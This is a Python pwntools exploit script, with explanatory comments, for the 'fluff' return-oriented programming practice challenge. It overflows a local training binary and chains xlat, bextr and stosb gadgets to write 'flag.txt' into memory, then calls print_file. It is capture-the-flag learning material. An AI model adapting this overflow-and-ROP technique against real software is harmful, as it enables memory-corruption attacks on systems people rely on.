# shout out to CryptoCat on youtube


from pwn import *

# find 'f', 'l, 'a', 'g', '.', 't', 'x', 't', in memory  (places in memory where these charecters appear) NOT FLAG.TXT string 
#with open('fluff', 'rb') as f:
#  s = f.read()
#for i in b'flag.txt':
#  print(i, ' -> ', hex(s.find(i)))

binary = context.binary = ELF("./fluff", checksec=False)
p = process(binary.path)
gdbscript = "b *0x400510"
pid = gdb.attach(p, gdbscript=gdbscript)

xlat = p64(0x400628)                                # xlat sets value of %rax to ptr*%rbx (only 1 byte)
stosb_rdi_al = p64(0x400639)                        # stosb sets value of ptr*rdi to %rax
writeable = p64(0x601337)                           # writeable section in memory
print_file = p64(0x400510)                          # print_file() location at got.plt
pop_rdi = p64(0x4006a3)                             # this will be used to feed flag.txt to print_file()
pop_rdx_rcx_add_rcx_bextr = p64(0x40062a)           # bextr sets value of %rbx to (%rdx bits) of %rcx
current_rax = 0xb                                   # value of rax before manipulation


# offsets within the binary where the charachters for flag.txt are
flag_locations = [0x3c4, 0x239, 0x3d6, 0x3cf, 0x24e, 0x192, 0x246, 0x192]
#                   f       l     a      g      .      t      x      t

real_locations = []
for index in flag_locations:
    index = hex(index + 0x400000)  # entry point for binary @ 0x400000
    real_locations.append(index) # find each char in memory and append it to real_locations

# arbitrary write primitive
flag = ["f", "l", "a", "g", ".", "t", "x", "t"] # we will index this list and write it into memory as a string
payload = b"\x90" * 40 # overwrite RSP



for index in range(8):
	if index != 0: # if not: set the current rax value to previous char
		current_rax = ord(flag[index - 1])
	# pop rdx ( index+length ), rcx ( current charachter location )
        # add rcx, 0x3ef2               ( we subtract this )
	# bextr rbx, rcx, rdx           ( preform bit field extract )
	payload += pop_rdx_rcx_add_rcx_bextr
	payload += p64(0x4000) # this value gets split: we feed this value to the bextr instruction which represents index value + length value: hex(64) for 64 bit and 00 being our index we want to start at from RCX (index: 0)
	# RAX holds the memory address of the charachter
	# current charachter: we subtract previous RAX, because we're looping & we subtract the hardcoded value
	payload += p64(int(real_locations[index], 16) - current_rax - 0x3ef2)
        # move bextr result from dl (RBX) into al (RAX) making it ready for stosb
	payload += xlat
	# pop address of .data section to RDI making it ready for stosb
	payload += pop_rdi
	# address of .data section + offset of charachter within string we are currently writing
	payload += p64(0x601337 + index)
	# store each byte from al (last significant byte of RAX) in memory pointed at RDI 
	payload += stosb_rdi_al

# pop rdi, ret
# location of flag.txt in memory
# print_file@got.plt location
payload += pop_rdi + writeable
payload += print_file

# Removes all the buffered data from a tube by calling pwnlib.tubes.tube.tube.recv() with a low timeout until it fails.
p.clean()
# send the payload to the program
p.sendline(payload)
# print flag & close program
print(p.recvall())
p.close()

